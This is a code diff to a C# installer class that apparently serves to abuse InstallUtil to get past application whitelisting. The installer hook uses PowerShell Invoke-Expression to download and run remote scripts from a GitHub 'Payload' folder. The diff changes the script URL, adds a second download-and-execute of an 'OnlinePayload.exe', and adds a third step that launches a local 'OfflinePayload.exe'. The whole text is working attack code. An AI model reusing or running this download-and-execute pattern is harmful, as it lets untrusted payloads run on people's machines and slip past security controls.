@@ -19,7 +19,17 @@ public class Sample : System.Configuration.Install.Installer
     {
         PowerShell ps = PowerShell.Create();
         ps.AddCommand("Invoke-Expression");
-        ps.AddArgument("IEX (New-Object Net.WebClient).DownloadString('https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/WhiteListTestScript.ps1')");
+        ps.AddArgument("IEX (New-Object Net.WebClient).DownloadString('https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/Csharp4InstallUntil/Csharp4InstallUntil.ps1')");
         ps.Invoke();
+
+        PowerShell ps2 = PowerShell.Create();
+        ps2.AddCommand("Invoke-Expression");
+        ps2.AddArgument("IEX (New-Object Net.WebClient).DownloadString('https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/Csharp4InstallUntil/Csharp4InstallUntilOnlinePayload.exe')");
+        ps2.Invoke();
+
+        PowerShell ps3 = PowerShell.Create();
+        ps3.AddCommand("Invoke-Expression");
+        ps3.AddArgument("Start-Process -FilePath 'Csharp4InstallUntilOfflinePayload.exe'");
+        ps3.Invoke();
     }
 }
